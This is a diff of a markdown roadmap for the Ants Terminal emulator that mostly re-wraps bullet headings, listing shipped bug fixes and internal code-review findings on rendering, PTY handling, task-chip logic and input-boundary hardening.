+- 📋 [ANTS-1188] **Claude Code's `Tempering…`/`Sublimating…` status-spinner lines pile up in scrollback instead of overwriting in place.** User report 2026-05-08 (screenshot
   captured): the same spinner status appears 5+ times in
   succession in scrollback as Claude Code updates its
   in-flight progress, with each frame showing a different
@@ -33174,8 +32918,7 @@ Project's own grep-rule corpus + fixture coverage: **55 pass,
 
 ### 🐛 Crash on app exit — Pty thread races MainWindow destruction (user report 2026-05-08)
 
-- ✅ [ANTS-1189] **`SIGABRT` in glibc `free()` during
-  TerminalWidget destruction at app exit.** Shipped 2026-05-08.
+- ✅ [ANTS-1189] **`SIGABRT` in glibc `free()` during TerminalWidget destruction at app exit.** Shipped 2026-05-08.
   Three crashes captured in coredumps (PIDs 3856, 10723, 17749).
   Stack trace pattern is identical:
 
@@ -33249,9 +32992,7 @@ Project's own grep-rule corpus + fixture coverage: **55 pass,
 
 ### 🐛 Debug-log infrastructure — Clear Log silences subsequent writes (user report 2026-05-08)
 
-- ✅ [ANTS-1190] **`Tools → Debug Mode → Clear Log File` permanently
-  silences subsequent `ANTS_LOG` writes until the user toggles a
-  category off-and-on.** Shipped 2026-05-08 (commit `98e6cb3`).
+- ✅ [ANTS-1190] **`Tools → Debug Mode → Clear Log File` permanently silences subsequent `ANTS_LOG` writes until the user toggles a category off-and-on.** Shipped 2026-05-08 (commit `98e6cb3`).
   User repro 2026-05-08 (root cause for the "VT debug log not
   capturing Flask startup" symptom): user toggled Vt + Claude +
   Perf categories, then clicked Clear Log File, then ran Flask —
@@ -33271,8 +33012,7 @@ Project's own grep-rule corpus + fixture coverage: **55 pass,
 
 ### 🐛 Tasks chip — no diagnostic logging on hide path (user report 2026-05-08)
 
-- ✅ [ANTS-1191] **`refreshTasksButton` had no diagnostic logging,
-  unlike `refreshBgTasksButton`.** User repro 2026-05-08: created
+- ✅ [ANTS-1191] **`refreshTasksButton` had no diagnostic logging, unlike `refreshBgTasksButton`.** User repro 2026-05-08: created
   11 tasks via `TaskCreate` in the active Claude Code session. The
   `.jsonl` recorded the events with current timestamps, but the
   status-bar Tasks chip stayed hidden. Without the per-refresh
@@ -33293,9 +33033,7 @@ Project's own grep-rule corpus + fixture coverage: **55 pass,
 
 ### 🔒 Path encoding — `_` → `-` collapse missing (user report 2026-05-08)
 
-- ✅ [ANTS-1192] **`encodeProjectPath` only collapsed `/`, not `_`,
-  silently breaking session-path resolution under
-  `~/.claude/projects/` for any cwd containing underscores.** ROOT
+- ✅ [ANTS-1192] **`encodeProjectPath` only collapsed `/`, not `_`, silently breaking session-path resolution under `~/.claude/projects/` for any cwd containing underscores.** ROOT
   CAUSE for the 2026-05-08 chip-hidden symptom AND for
   ANTS-1052 (BG-tasks button missing — same encoding mismatch).
   Diagnosed via the ANTS-1191 diagnostic line on the same day,
@@ -33323,8 +33061,7 @@ Project's own grep-rule corpus + fixture coverage: **55 pass,
 
 ### 🐛 Paint pipeline — cell mutations don't trigger viewport repaint (user reports 2026-05-07/08)
 
-- ✅ [ANTS-1193] **`TerminalWidget` viewport doesn't repaint when
-  `onVtBatch` mutates cells, even though `update()` is called.**
+- ✅ [ANTS-1193] **`TerminalWidget` viewport doesn't repaint when `onVtBatch` mutates cells, even though `update()` is called.**
   Closed 2026-05-08 — the umbrella was misdiagnosed. The actual
   root cause was ANTS-1194 (TerminalGrid::resize() only clamped
   the scroll region, never widened on grow). With the scroll
@@ -33435,8 +33172,7 @@ Project's own grep-rule corpus + fixture coverage: **55 pass,
 
 ### 🐛 TerminalGrid::resize — default scroll region doesn't grow with grid (user report 2026-05-08, ANTS-1187/1193 root cause)
 
-- ✅ [ANTS-1194] **`TerminalGrid::resize()` only clamped the scroll
-  region; never widened it on grow.** Shipped 2026-05-08.
+- ✅ [ANTS-1194] **`TerminalGrid::resize()` only clamped the scroll region; never widened it on grow.** Shipped 2026-05-08.
   User-reported symptom: tab opens at 24×80 default → user
   maximizes window to (e.g.) 60 rows → `m_scrollBottom` stays at
   23 because `std::clamp(23, 0, 59) == 23`. Output piles into
@@ -33505,9 +33241,7 @@ protocol.
 
 ### 🐛 User-feedback fixes (2026-05-08)
 
-- ✅ [ANTS-1214] **Idle "Command Complete" notification fires on
-  every long-running command, including successful watchdog
-  ticks.** User report 2026-05-08: `notify-send "Command Complete
+- ✅ [ANTS-1214] **Idle "Command Complete" notification fires on every long-running command, including successful watchdog ticks.** User report 2026-05-08: `notify-send "Command Complete
   — Finished after 37s"` repeating from a system-resource
   watchdog tab, breaking focus during normal work. Root cause:
   `terminalwidget.cpp:checkIdleNotification()` fired for any
@@ -33519,8 +33253,7 @@ protocol.
   **Layman:** Ants Terminal stops nagging you when commands
   succeed; only failures interrupt your focus now.
   Kind: fix. Source: user-2026-05-08.
-- ✅ [ANTS-1216] **Tasks chip stays visible after every task is done
-  + miscount of "deleted" tasks as unfinished.** User report
+- ✅ [ANTS-1216] **Tasks chip stays visible after every task is done + miscount of "deleted" tasks as unfinished.** User report
   2026-05-08 (screenshot): Task List dialog showed "27 done, 0
   running, 0 outstanding" but the status-bar chip still read
   "☰ 1/28" and hadn't dimmed. Two stacked bugs:
@@ -33541,9 +33274,7 @@ protocol.
   when you've actually finished everything, instead of lingering
   with a "0" indicator.
   Kind: fix. Source: user-2026-05-08.
-- ✅ [ANTS-1215] **Review Changes button stays active after every
-  push because of an untracked `.directory` file (KDE Dolphin
-  metadata).** User report 2026-05-08 with screenshot of a clean
+- ✅ [ANTS-1215] **Review Changes button stays active after every push because of an untracked `.directory` file (KDE Dolphin metadata).** User report 2026-05-08 with screenshot of a clean
   pushed branch + sole `?? .directory` line in `git status`.
   Root cause: `mainwindow.cpp:refreshReviewButton()` treated any
   non-header `git status --porcelain=v1 -b` line as "dirty,"
@@ -33556,8 +33287,7 @@ protocol.
   **Layman:** the "Review Changes" button stops lighting up just
   because of stray IDE/desktop-environment metadata files.
   Kind: fix. Source: user-2026-05-08.
-- ✅ [ANTS-1218] **Tasks chip "X/Y" semantics are inverted —
-  reads as completed-of-total but is actually remaining-of-total.**
+- ✅ [ANTS-1218] **Tasks chip "X/Y" semantics are inverted — reads as completed-of-total but is actually remaining-of-total.**
   User report 2026-05-10 (screenshot): Task List dialog showed
   "30 tasks — 24 done, 1 running, 5 outstanding" while the chip
   read "☰ 6/30". X/Y is universally read as "X done out of Y"
@@ -33581,8 +33311,7 @@ protocol.
   "6 done out of 30." Flipping it to count up matches how
   progress is shown everywhere else.
   Kind: fix. Source: user-2026-05-10.
-- ✅ [ANTS-1219] **Task List dialog accumulates stale tasks
-  across sessions instead of showing only current.** User
+- ✅ [ANTS-1219] **Task List dialog accumulates stale tasks across sessions instead of showing only current.** User
   report 2026-05-10 (same screenshot as ANTS-1218): dialog
   shows entries from prior compacted sessions ("Phase 2 — Add
   test_vt bundle…", "Phase 2 — Update tests/features/README.md",
@@ -33617,8 +33346,7 @@ protocol.
   When the bug reappears we will know exactly which layer to
   fix because the diagnostic log will name it.
   Kind: feature/fix. Source: user-2026-05-10.
-- 📋 [ANTS-1220] **Scrollback duplication while terminal was idle
-  / user away — content re-rendered without input.** User report
+- 📋 [ANTS-1220] **Scrollback duplication while terminal was idle / user away — content re-rendered without input.** User report
   2026-05-10 (screenshot: a Claude Code response with a horizontal
   underscore band partway down, beneath which an *earlier* portion
   of the same response begins replaying — content from before the
@@ -33657,9 +33385,7 @@ protocol.
   figure out which layer (shell, terminal, or Claude itself) is
   re-emitting content on idle.
   Kind: bug. Source: user-2026-05-10.
-- ✅ [ANTS-1221] **Tasks chip stays visible when only an
-  `in_progress` task remains (no `pending`) — refinement of
-  ANTS-1216 contract.** User report 2026-05-10 (screenshot:
+- ✅ [ANTS-1221] **Tasks chip stays visible when only an `in_progress` task remains (no `pending`) — refinement of ANTS-1216 contract.** User report 2026-05-10 (screenshot:
   Task List dialog says "41 tasks — 40 done, 1 running, 0
   outstanding" but the chip still reads "☰ 1/41"). Root cause
   is intentional per ANTS-1216's fix: `unfinishedCount()` counts
@@ -33691,8 +33417,7 @@ protocol.
   there's nothing for *you* to do, so it shouldn't be there. The
   chip should only count tasks waiting on you.
   Kind: fix. Source: user-2026-05-10.
-- ✅ [ANTS-1222] **Show build metadata in Help → About Ants
-  Terminal….** User request 2026-05-10: the About dialog currently
+- ✅ [ANTS-1222] **Show build metadata in Help → About Ants Terminal….** User request 2026-05-10: the About dialog currently
   surfaces only `Version` (from `ANTS_VERSION`) and `Qt runtime`
   (with optional `Lua: 5.4`). Distro maintainers and bug reporters
   routinely need the build context behind a binary — what was
@@ -33721,9 +33446,7 @@ protocol.
   bug we can tell at a glance which exact build they're running —
   date, debug-or-release, git commit, and which compiler made it.
   Kind: feature. Source: user-2026-05-10.
-- ✅ [ANTS-1224] **Task List parser ignores `isCompactSummary`
-  checkpoint — pre-compact tasks survive into post-relaunch
-  state.** Live reproduction 2026-05-10 in session `94218f91-…`:
+- ✅ [ANTS-1224] **Task List parser ignores `isCompactSummary` checkpoint — pre-compact tasks survive into post-relaunch state.** Live reproduction 2026-05-10 in session `94218f91-…`:
   user `/compact`'d, `/exit`'d, then "Continue previous coding
   session" — Tasks chip shows 5 stale tasks created before the
   compact, dialog renders the same five. Root cause localized to
@@ -33751,8 +33474,7 @@ protocol.
   teaches the task-list parser to recognise the "compaction
   happened" marker as a checkpoint and reset.
   Kind: fix. Source: user-2026-05-10.
-- ✅ [ANTS-1225] **Claude status indicator stays hidden after
-  `/compact` + `/exit` + `claude --resume` until tab-switch.**
+- ✅ [ANTS-1225] **Claude status indicator stays hidden after `/compact` + `/exit` + `claude --resume` until tab-switch.**
   Live reproduction 2026-05-10, same session as ANTS-1224.
   After resuming Claude in the same shell tab, the bottom-bar
   Claude status label (`m_statusLabel` — "Claude: idle/thinking/
@@ -33811,8 +33533,7 @@ protocol.
   rest of the app, instead of being drawn in your desktop's
   default grey.
   Kind: fix. Source: user-2026-05-11.
-- ✅ [ANTS-1241] **RoadmapDialog v2: inline `#NNNN` on summary row +
-  larger ID font.** Third-pass user feedback after ANTS-1240
+- ✅ [ANTS-1241] **RoadmapDialog v2: inline `#NNNN` on summary row + larger ID font.** Third-pass user feedback after ANTS-1240
   (2026-05-11): the card's `#NNNN` (and shipped date) were emitted
   on a separate `<div class="rm-meta">` row below the summary line,
   which (a) hit the same Qt nested-block `QPalette::Base` frame
@@ -33832,8 +33553,7 @@ protocol.
   colour mismatch on the ID row that came from the same Qt
   rendering quirk we hit yesterday on the expanded body.
   Kind: fix. Source: user-2026-05-11.
-- ✅ [ANTS-1240] **RoadmapDialog v2: theme palette + expanded-body
-  background frame.** Second-pass user feedback after the ANTS-1239
+- ✅ [ANTS-1240] **RoadmapDialog v2: theme palette + expanded-body background frame.** Second-pass user feedback after the ANTS-1239
   link-colour fix (2026-05-11). (1) Only `QPalette::Link` /
   `LinkVisited` were themed; the QDialog window, the `QListWidget`
   TOC sidebar, and the viewer's `Base` / `Text` roles all fell
@@ -33861,8 +33581,7 @@ protocol.
   background colour as the card itself — no more visible colour
   break inside an opened card.
   Kind: fix. Source: user-2026-05-11.
-- ✅ [ANTS-1239] **RoadmapDialog v2: duplicate heading slugs + black
-  `<a>` text on dark themes.** Two bugs surfaced by user test-drive
+- ✅ [ANTS-1239] **RoadmapDialog v2: duplicate heading slugs + black `<a>` text on dark themes.** Two bugs surfaced by user test-drive
   of 0.7.83's card renderer (2026-05-11). (1) Three `### Performance`
   h3s (under 0.7.0, 0.8.0, Beyond 1.0) all slugged to `performance`,
   so expanding one expanded all three and `bySection["performance"]`
@@ -33950,9 +33669,7 @@ screen mode. Comments survive but their truth conditions don't.
 
 ### 🔒 Tier 1 — ship-this-week fixes (CRITICAL after calibration)
 
-- ✅ [ANTS-3774] **Zombie feature: `m_fallbackFont` (emoji/CJK) and
-  `m_nerdFallbackFont` (Powerline) loaded, sized on font-size change,
-  never used in any render path.** `terminalwidget.cpp:138-166` +
+- ✅ [ANTS-3774] **Zombie feature: `m_fallbackFont` (emoji/CJK) and `m_nerdFallbackFont` (Powerline) loaded, sized on font-size change, never used in any render path.** `terminalwidget.cpp:138-166` +
   `terminalwidget.h:529-530, 685-686`. Constructor probes for fonts,
   flags `m_hasFallbackFont` / `m_hasNerdFallback`, `setFontSize`
   faithfully resizes — but grep across the file returns zero non-
@@ -33969,8 +33686,7 @@ screen mode. Comments survive but their truth conditions don't.
   + final `'p'`. Same bug shape as ANTS-1194 (stale scroll region
   traps user) — closes the broader contract. Add to `processCsi` /
   `handleEsc`. Kind: fix. Source: indie-review-2026-05-08.
-- ✅ [ANTS-3776] **OSC 9;4 progress disambiguator misclassifies
-  short payload `9;4`.** `terminalgrid.cpp:1310-1331`. Length-check
+- ✅ [ANTS-3776] **OSC 9;4 progress disambiguator misclassifies short payload `9;4`.** `terminalgrid.cpp:1310-1331`. Length-check
   requires ≥4; payload `"9;4"` (legal ConEmu state-0 "remove
   progress") falls through to OSC 9 desktop notification at line
   1338 and pops a notification with body "4". Fix predicate to
@@ -33979,8 +33695,7 @@ screen mode. Comments survive but their truth conditions don't.
   literally starts with "4;" — recommend documenting the
   disambiguator behaviour in CLAUDE.md. Kind: fix. Source:
   indie-review-2026-05-08.
-- ✅ [ANTS-3777] **Per-style font setters miss `setKerning(false)`,
-  break monospace contract.** `terminalwidget.cpp:4950-4976` —
+- ✅ [ANTS-3777] **Per-style font setters miss `setKerning(false)`, break monospace contract.** `terminalwidget.cpp:4950-4976` —
   `setBoldFontFamily` / `setItalicFontFamily` /
   `setBoldItalicFontFamily` reconstruct fonts but bypass
   `updateFontMetrics()` which otherwise re-asserts kerning-off.
@@ -33993,9 +33708,7 @@ screen mode. Comments survive but their truth conditions don't.
 
 ### 🔒 Tier 2 — pre-release sweep (HIGH / MEDIUM)
 
-- ✅ [ANTS-3778] **`recalcGridSize` clears the snapshot
-  unconditionally; sync-block straddling resize tears for the
-  inter-batch window.** `terminalwidget.cpp:2789` —
+- ✅ [ANTS-3778] **`recalcGridSize` clears the snapshot unconditionally; sync-block straddling resize tears for the inter-batch window.** `terminalwidget.cpp:2789` —
   `clearScreenSnapshot()` runs even when `m_syncOutputActive`. Spec
   ANTS-1148 §H1 calls out this case; recovery via the disjunction
   works but only on next batch. Add immediate re-capture:
@@ -34009,15 +33722,13 @@ screen mode. Comments survive but their truth conditions don't.
   safety-timer fires, force the grid out via synthetic `\x1B[?2026l`
   action. `terminalwidget.cpp:187, 195-197, 2195, 2211-2215`.
   Kind: fix. Source: indie-review-2026-05-08.
-- ✅ [ANTS-1201] **OSC 52 selection field discarded; clipboard
-  target hardcoded.** `terminalgrid.cpp:1083-1132`. xterm spec:
+- ✅ [ANTS-1201] **OSC 52 selection field discarded; clipboard target hardcoded.** `terminalgrid.cpp:1083-1132`. xterm spec:
   `p` (primary) shouldn't clobber `c` (system clipboard); on Linux
   this matters for `pbcopy`-equivalent shell aliases targeting
   primary. Either honour selection field downstream (plumb through
   the OSC52 sentinel envelope) or document single-target limitation
   in CLAUDE.md. Kind: fix. Source: indie-review-2026-05-08.
-- ✅ [ANTS-1202] **OSC 8 hyperlink hardening — three findings
-  bundled.** (1) `terminalgrid.cpp:1075-1078`: `id=` parser harvests
+- ✅ [ANTS-1202] **OSC 8 hyperlink hardening — three findings bundled.** (1) `terminalgrid.cpp:1075-1078`: `id=` parser harvests
   embedded `id=` from a non-id value (`"x=id=trick"` → id=`"trick"`).
   Use key-by-key scan splitting `:` first, then `=`. (2)
   `terminalgrid.cpp:1057-1066`: re-opening OSC 8 without close uses
@@ -34027,16 +33738,14 @@ screen mode. Comments survive but their truth conditions don't.
   reopen. (3) `terminalgrid.cpp:1039-1049`: URI-scheme allowlist
   applied on open only, not close (defense-in-depth gap). Kind:
   fix. Source: indie-review-2026-05-08.
-- ✅ [ANTS-1203] **`rewrap()` ignores wide-char boundaries on
-  resize.** `terminalgrid.cpp:2245-2258`. `int chunk = std::min(cols,
+- ✅ [ANTS-1203] **`rewrap()` ignores wide-char boundaries on resize.** `terminalgrid.cpp:2245-2258`. `int chunk = std::min(cols,
   total - pos)` pays no attention to `Cell::isWideChar` /
   `isWideCont`; can split a double-width character with its
   continuation cell on the next reflowed line. Pre-existing
   (predates ANTS-1194). Decrement `chunk` by 1 when
   `logical.cells[pos+chunk-1].isWideChar`. Kind: fix. Source:
   indie-review-2026-05-08.
-- ✅ [ANTS-1204] **`primaryWasFullScreen` rename + initialize
-  `m_altScrollBottom = m_rows - 1`.** Lane A M1 + M3. Variable
+- ✅ [ANTS-1204] **`primaryWasFullScreen` rename + initialize `m_altScrollBottom = m_rows - 1`.** Lane A M1 + M3. Variable
   name (`terminalgrid.cpp:2199-2202`) inverts reality during alt-
   screen because the swap at 632-633 puts the saved-primary in
   the alt slots. Rename to `liveWasFullScreen` /
@@ -34054,8 +33763,7 @@ screen mode. Comments survive but their truth conditions don't.
   `m_paintLayout.clearFormats()` at the top of the runs loop +
   comment naming the contract. Pre-empts a class of bug invisible
   to tests. Kind: fix. Source: indie-review-2026-05-08.
-- ✅ [ANTS-1213] **DECRQSS comment cleanup (CRITICAL→HIGH after
-  threat-model calibration).** `terminalgrid.cpp:846-847` claims
+- ✅ [ANTS-1213] **DECRQSS comment cleanup (CRITICAL→HIGH after threat-model calibration).** `terminalgrid.cpp:846-847` claims
   "DECRQSS (DCS $q) is not implemented" while `handleDcs` at line
   2511 implements it. Calibration: the implementation IS safe
   (replies are terminal-controlled, not echo of attacker bytes —
@@ -34106,8 +33814,7 @@ screen mode. Comments survive but their truth conditions don't.
   underline active on a space. xterm reference clears all
   attrs except bg/fg on ECH. Mirror `clearRow` pattern. Kind:
   fix. Source: indie-review-2026-05-08.
-- ✅ [ANTS-3780] **`tline.setLineWidth(length * cellW * 2)` fudge
-  + minor render polish.** `terminalwidget.cpp:1024`. UTF-16
+- ✅ [ANTS-3780] **`tline.setLineWidth(length * cellW * 2)` fudge + minor render polish.** `terminalwidget.cpp:1024`. UTF-16
   length not glyph cells; `* 2` factor is a fix for the wrong
   problem (CJK doubles, emoji surrogates). Replace with
   `qreal(INT_MAX)` or `qInf()`. Companion polish: underline pen
@@ -34169,8 +33876,7 @@ structural and lives elsewhere. Closing all sites in one sweep
 
 ### 🔥 Cross-cutting themes (patterns caught by ≥2 reviewers)
 
-- ✅ **Dialog-staleness pattern recurs in 5+ sites (ANTS-1163
-  family).** Lanes 4, 6, 10 independently surfaced cached
+- ✅ **Dialog-staleness pattern recurs in 5+ sites (ANTS-1163 family).** Lanes 4, 6, 10 independently surfaced cached
   dialogs that don't reset state on re-show: `m_aiDialog`,
   `m_sshDialog`, `m_claudeDialog`, `m_claudeProjects`,
   `m_claudeTranscript` in `mainwindow.cpp:1142-3711`;
@@ -34207,16 +33913,14 @@ structural and lives elsewhere. Closing all sites in one sweep
   setters take untrusted strings; main.cpp `--remote send-text`
   stdin no length cap. Bundled into ANTS-1169 (boundary-cap
   audit).
-- ✅ **`m_engines.values()` per-call allocation on hot
-  paths** — independently flagged by static analysis (clazy)
+- ✅ **`m_engines.values()` per-call allocation on hot paths** — independently flagged by static analysis (clazy)
   AND Lane 7 reviewer. Cross-confirmation upgrades confidence;
   rolled into ANTS-1185 (Qt6 idiom polish bundle) but kept on
   the cross-cutting list because both signals saw it.
 
 ### 🔒 Tier 1 — ship-this-week fixes (CRITICAL — security/data-loss/dead documented features)
 
-- ✅ **[ANTS-116&] [🔒 Security] PTY-write debug log leaks
-  keystroke + paste payloads.** `ptyhandler.cpp:333` writes
+- ✅ **[ANTS-116&] [🔒 Security] PTY-write debug log leaks keystroke + paste payloads.** `ptyhandler.cpp:333` writes
   `data.left(60).toPercentEncoding()` when `ANTS_DEBUG=pty` or
   `=all` is set, with NO call to `SecretRedact::scrub()`. Short
   tokens (`ghp_…` 40 chars, `AKIA…` 20 chars, sub-60-char
@@ -34229,8 +33933,7 @@ structural and lives elsewhere. Closing all sites in one sweep
   explicit "include-payloads" sub-flag.
   **Source:** indie-review 2026-05-07 (Lane 11 C-1).
   **Kind:** fix.
-- ✅ **[ANTS-116&] [🐛 Bug] `Ctrl+Shift+Up/Down` configured
-  bookmark shortcut silently dead.** `mainwindow.cpp:1678,1686`
+- ✅ **[ANTS-116&] [🐛 Bug] `Ctrl+Shift+Up/Down` configured bookmark shortcut silently dead.** `mainwindow.cpp:1678,1686`
   bind `next_bookmark`/`prev_bookmark` QShortcuts on the same
   chord that `mainwindow.cpp:1266,1271` advertise as
   "Previous/Next Prompt" (intercepted by
@@ -34244,8 +33947,7 @@ structural and lives elsewhere. Closing all sites in one sweep
   startup.
   **Source:** indie-review 2026-05-07 (Lane 4 C-1).
   **Kind:** fix.
-- ✅ **[ANTS-116&] [🔒 Security] Kitty APC `a=d,d=a` wipes
-  Sixel + iTerm2 images cross-protocol.**
+- ✅ **[ANTS-116&] [🔒 Security] Kitty APC `a=d,d=a` wipes Sixel + iTerm2 images cross-protocol.**
   `terminalgrid.cpp:2773-2777` — Kitty graphics protocol
   "delete all images" is supposed to clear only Kitty-protocol
   images, but the implementation also clears `m_inlineImages`,
@@ -34257,8 +33959,7 @@ structural and lives elsewhere. Closing all sites in one sweep
   separate Kitty-only display vector.
   **Source:** indie-review 2026-05-07 (Lane 1 C-1).
   **Kind:** fix.
-- ✅ **[ANTS-116&] [🐛 Bug] `forkpty` F_SETFL return value
-  ignored; silent fall-through to blocking master.**
+- ✅ **[ANTS-116&] [🐛 Bug] `forkpty` F_SETFL return value ignored; silent fall-through to blocking master.**
   `ptyhandler.cpp:311-318` — the second `fcntl(F_SETFL, …|
   O_NONBLOCK)` return is unchecked. If F_GETFL fails the
   `if (flags >= 0)` guard at line 316 swallows it entirely. A
@@ -34272,8 +33973,7 @@ structural and lives elsewhere. Closing all sites in one sweep
 
 ### 🔒 Tier 1 — ship-this-week fixes (HIGH — composing with the criticals)
 
-- ✅ **[ANTS-116&] [🐛 Bug] ANTS-1163 dialog-staleness sweep
-  across all cached dialogs.** Same pattern, ≥5 sites:
+- ✅ **[ANTS-116&] [🐛 Bug] ANTS-1163 dialog-staleness sweep across all cached dialogs.** Same pattern, ≥5 sites:
   (a) `mainwindow.cpp:1142-1163` `m_sshDialog` keeps form
   values across re-opens; (b) `mainwindow.cpp:1372-1389`
   `m_aiDialog` re-pushes terminal context but dialog-local
@@ -34301,8 +34001,7 @@ structural and lives elsewhere. Closing all sites in one sweep
   **Source:** indie-review 2026-05-07 (Lane 4 H-1, Lane 6
   C-1+H-1+H-2, Lane 10 H-1). **Cross-cutting theme A**.
   **Kind:** fix.
-- ✅ **[ANTS-116&] [🔒 Security] Boundary-cap audit —
-  every untrusted-input crossing.** Eight sites surfaced
+- ✅ **[ANTS-116&] [🔒 Security] Boundary-cap audit — every untrusted-input crossing.** Eight sites surfaced
   by 6 reviewers; all share the same shape (untrusted input
   + missing max-size or canonicalize-and-prefix-check).
   (a) `claudebgtasksdialog.cpp:50-67` `tailFile` reads
@@ -34334,8 +34033,7 @@ structural and lives elsewhere. Closing all sites in one sweep
   Lane 2 H-3, Lane 6 H-3+H-4, Lane 8 H-3, Lane 9 H-3,
   Lane 11 main.cpp). **Cross-cutting theme C**.
   **Kind:** fix.
-- ✅ **[ANTS-117&] [🔒 Security] `ANTS_DEBUG` opt-in gate
-  + log rotation.** `main.cpp:195-199` reads the env
+- ✅ **[ANTS-117&] [🔒 Security] `ANTS_DEBUG` opt-in gate + log rotation.** `main.cpp:195-199` reads the env
   unconditionally; an inherited `ANTS_DEBUG=all` from a CI
   image / `.envrc` / sourced helper silently turns on
   full keystroke capture. `debuglog.cpp:87` opens with
@@ -34351,8 +34049,7 @@ structural and lives elsewhere. Closing all sites in one sweep
 
 ### 🔒 Tier 2 — hardening sweep (HIGH/MEDIUM)
 
-- ✅ **[ANTS-117&] [🐛 Bug] Audit pipeline-order spec/code
-  drift.** `auditdialog.cpp:4009-4033` does
+- ✅ **[ANTS-117&] [🐛 Bug] Audit pipeline-order spec/code drift.** `auditdialog.cpp:4009-4033` does
   `dedup → comment/string → mypy-stub-fold → cap`; CLAUDE.md
   (post-ANTS-1136 doc-fix) declares
   `dedup → cap → comment/string → mypy-stub-fold →
@@ -34365,8 +34062,7 @@ structural and lives elsewhere. Closing all sites in one sweep
   **Source:** indie-review 2026-05-07 (Lane 5 C-1; calibrated
   HIGH per single-user threat model).
   **Cross-cutting theme B**. **Kind:** fix.
-- ✅ **[ANTS-117&] [🔒 Security] Lua C-call wall-clock
-  watchdog (un-defer ANTS-1143).** `luaengine.cpp:94-100`
+- ✅ **[ANTS-117&] [🔒 Security] Lua C-call wall-clock watchdog (un-defer ANTS-1143).** `luaengine.cpp:94-100`
   `LUA_MASKCOUNT` instruction-count timeout doesn't fire
   inside pure-C Lua calls (`string.find/match/gsub/rep`,
   `table.sort`). PLUGINS.md openly admits the limitation;
@@ -34379,8 +34075,7 @@ structural and lives elsewhere. Closing all sites in one sweep
   **Source:** indie-review 2026-05-07 (Lane 7 C-1; calibrated
   HIGH — plugin trust model is "I trust this author", UI
   freeze not RCE). **Kind:** fix.
-- ✅ **[ANTS-117&] [🐛 Bug] Plugin `unloadAll` snapshot
-  before iteration.** `pluginmanager.cpp:50-58` doesn't
+- ✅ **[ANTS-117&] [🐛 Bug] Plugin `unloadAll` snapshot before iteration.** `pluginmanager.cpp:50-58` doesn't
   snapshot `m_engines` before iterating, unlike `fireEvent`
   at line 323 which does. If an `unload` handler re-enters
   the event loop (status signal → palette repaint →
@@ -34390,8 +34085,7 @@ structural and lives elsewhere. Closing all sites in one sweep
   Three-line snapshot fix.
   **Source:** indie-review 2026-05-07 (Lane 7 H-2).
   **Kind:** fix.
-- ✅ **[ANTS-117&] [🐛 Bug] Mainwindow lifetime hygiene —
-  Connection leak + proxy-action heap leak.**
+- ✅ **[ANTS-117&] [🐛 Bug] Mainwindow lifetime hygiene — Connection leak + proxy-action heap leak.**
   (a) `mainwindow.cpp:2240,2258,2266`
   `std::make_shared<QMetaObject::Connection>` lambdas leak
   the `Connection` object until the last lambda copy is
@@ -34407,8 +34101,7 @@ structural and lives elsewhere. Closing all sites in one sweep
   pass real menu QActions to `CommandPalette::setActions`.
   **Source:** indie-review 2026-05-07 (Lane 4 H-3+H-4).
   **Kind:** fix.
-- ✅ **[ANTS-117&] [🐛 Bug] PTY robustness — envp
-  truncation log + waitpid finished semantic.**
+- ✅ **[ANTS-117&] [🐛 Bug] PTY robustness — envp truncation log + waitpid finished semantic.**
   (a) `ptyhandler.cpp:156-179` `kEnvpCap=512` silently
   truncates parent environ. Modern desktop sessions can
   exceed 500 entries; child shell loses PATH/HOME with no
@@ -34425,8 +34118,7 @@ structural and lives elsewhere. Closing all sites in one sweep
   "tab is dying."
   **Source:** indie-review 2026-05-07 (Lane 3 H-1+H-2).
   **Kind:** fix.
-- ✅ **[ANTS-117&] [🔒 Security] Remote-control
-  observability + receive cap.**
+- ✅ **[ANTS-117&] [🔒 Security] Remote-control observability + receive cap.**
   (a) `remotecontrol.cpp:223-505` no `ANTS_LOG` on any
   dispatched verb (`cmdSendText` / `cmdLaunch` /
   `cmdNewTab` / `cmdSetTitle` / `cmdSelectWindow`). Logging
@@ -34443,8 +34135,7 @@ structural and lives elsewhere. Closing all sites in one sweep
   on `runClient`'s receive loop.
   **Source:** indie-review 2026-05-07 (Lane 8 H-2+H-3).
   **Kind:** fix.
-- ✅ **[ANTS-117&] [🐛 Bug] ANTS-1116 INV-6
-  spec/code reconciliation.** `antshelper.cpp:77` emits
+- ✅ **[ANTS-117&] [🐛 Bug] ANTS-1116 INV-6 spec/code reconciliation.** `antshelper.cpp:77` emits
   `"drift script killed by signal"` (no N); ANTS-1116
   INV-6/INV-8 mandates `"drift script killed by signal N"`.
   Pick one source of truth: either revise INV-6 to drop N
@@ -34453,8 +34144,7 @@ structural and lives elsewhere. Closing all sites in one sweep
   disclaimer.
   **Source:** indie-review 2026-05-07 (Lane 8 H-1).
   **Cross-cutting theme B**. **Kind:** fix.
-- ✅ **[ANTS-117&] [🔒 Security] SettingsDialog regex
-  validation + AI key ImhSensitiveData.**
+- ✅ **[ANTS-117&] [🔒 Security] SettingsDialog regex validation + AI key ImhSensitiveData.**
   (a) `settingsdialog.cpp:982-1012` Highlights/Triggers
   regex strings pushed into config without
   `QRegularExpression::isValid()` + `isCatastrophicRegex()`
@@ -34470,8 +34160,7 @@ structural and lives elsewhere. Closing all sites in one sweep
   predictive cache can capture keystrokes.
   **Source:** indie-review 2026-05-07 (Lane 10 H-2+H-3).
   **Kind:** fix.
-- ✅ **[ANTS-117&] [🐛 Bug] Config robustness — NaN guard,
-  asymmetric validation, theme cache.**
+- ✅ **[ANTS-117&] [🐛 Bug] Config robustness — NaN guard, asymmetric validation, theme cache.**
   (a) `config.cpp:130` `QJsonDocument(m_data).toJson()`
   writes NaN/Infinity as `null` per RFC 8259. `setRawData`
   accepts arbitrary `QJsonObject`; future numeric setter
@@ -34493,8 +34182,7 @@ structural and lives elsewhere. Closing all sites in one sweep
 
 ### ⚡ / 🏗 Tier 3 — structural (after Tier 1/2 lands)
 
-- ✅ **[ANTS-118&] [⚡ Performance] Per-cell `fillRect`
-  coalescing in paintEvent.** `terminalwidget.cpp:806-811`
+- ✅ **[ANTS-118&] [⚡ Performance] Per-cell `fillRect` coalescing in paintEvent.** `terminalwidget.cpp:806-811`
   inner per-cell loop calls `p.fillRect(...)` every cell
   whose bg differs from default; `N×cols` per frame for
   fully-styled vim status lines. The `TextRun` aggregator
@@ -34504,8 +34192,7 @@ structural and lives elsewhere. Closing all sites in one sweep
   fix.
   **Source:** indie-review 2026-05-07 (Lane 2 H-1).
   **Kind:** improve.
-- ✅ **[ANTS-118&] [🧹 Refactor] Extract `setupMenus()`
